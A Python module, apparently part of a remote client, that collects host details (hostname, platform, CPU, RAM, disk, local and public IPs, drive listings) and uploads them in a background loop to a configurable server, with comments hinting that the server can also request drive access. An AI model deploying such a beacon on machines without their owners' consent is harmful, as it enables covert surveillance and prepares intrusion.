from datetime import datetime
import socket
import platform
import requests
import time
import threading

import config
from utils import scan_available_drives


def get_system_info() -> str:
    try:
        info = []
        info.append(f"[System Information - {datetime.now().isoformat()}]")
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"Platform: {platform.platform()}")
        # psutil may not be available in minimal environments
        try:
            import psutil
            info.append(f"Processor: {platform.processor()}")
            info.append(f"CPU Count: {psutil.cpu_count()}")
            info.append(f"CPU Usage: {psutil.cpu_percent()}%")
            mem = psutil.virtual_memory()
            info.append(f"Total RAM: {mem.total / (1024**3):.2f} GB")
            info.append(f"Available RAM: {mem.available / (1024**3):.2f} GB")
            info.append(f"RAM Usage: {mem.percent}%")
            info.append(f"Disk Usage: {psutil.disk_usage('/').percent}%")
        except ImportError:
            pass
        return "\n".join(info)
    except Exception as e:
        return f"Error gathering system info: {e}"


def get_location_info() -> str:
    try:
        info = []
        info.append(f"[Location Information - {datetime.now().isoformat()}]")
        try:
            hostname = socket.gethostname()
            info.append(f"Hostname: {hostname}")
            ipv4 = socket.gethostbyname(hostname)
            info.append(f"IPv4: {ipv4}")
        except Exception:
            info.append("IPv4: Unable to determine")
        try:
            ipv6 = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
            info.append(f"IPv6: {ipv6}")
        except Exception:
            info.append("IPv6: Unable to determine")
        try:
            resp = requests.get("https://api.ipify.org?format=json", timeout=5)
            if resp.status_code == 200:
                public_ip = resp.json().get("ip", "Unknown")
                info.append(f"Public IPv4: {public_ip}")
        except Exception:
            info.append("Public IPv4: Unable to determine")
        return "\n".join(info)
    except Exception as e:
        return f"Error gathering location info: {e}"


def _upload_sysinfo(combined_info: str):
    try:
        resp = requests.post(
            f"{config.SERVER_URL}/sysinfo/save/{config.PC_NAME}",
            data=combined_info,
            headers={"Content-Type": "text/plain"},
            timeout=5,
        )
        if resp.status_code == 200:
            print(f"[+] Komplette Sysinfo hochgeladen", flush=True)
            # Removed: Don't send system notifications, only drive requests
        else:
            print(f"[-] Failed to upload sysinfo: HTTP {resp.status_code}", flush=True)
    except Exception as e:
        print(f"[-] Failed to upload sysinfo: {e}", flush=True)



def sysinfo_worker():
    print(f"[*] Sysinfo-Thread gestartet (update alle {config.SYSINFO_UPDATE_INTERVAL}s)", flush=True)
    while True:
        try:
            print("[*] Sammle alle Systeminformationen in eine Datei...", flush=True)
            info_parts = []
            info_parts.append(get_system_info())
            info_parts.append("\n" + "="*70 + "\n")
            info_parts.append(get_location_info())
            info_parts.append("\n" + "="*70 + "\n")
            info_parts.append(f"[Drive Information - {datetime.now().isoformat()}]")
            drives = scan_available_drives()
            for drive_letter, drive_info in drives.items():
                info_parts.append(f"{drive_letter}: ({drive_info['type']})")
                info_parts.append(f"  Path: {drive_info['path']}")
                info_parts.append(f"  Total: {drive_info['total'] / (1024**3):.2f} GB")
                info_parts.append(f"  Used: {drive_info['used'] / (1024**3):.2f} GB")
                info_parts.append(f"  Free: {drive_info['free'] / (1024**3):.2f} GB")
                info_parts.append(f"  Usage: {drive_info['percent']}%")
                info_parts.append("")
            combined_info = "\n".join(info_parts)
            threading.Thread(target=_upload_sysinfo, args=(combined_info,), daemon=True).start()
        except Exception as e:
            print(f"[-] Sysinfo Fehler: {type(e).__name__}: {e}", flush=True)
        time.sleep(config.SYSINFO_UPDATE_INTERVAL)
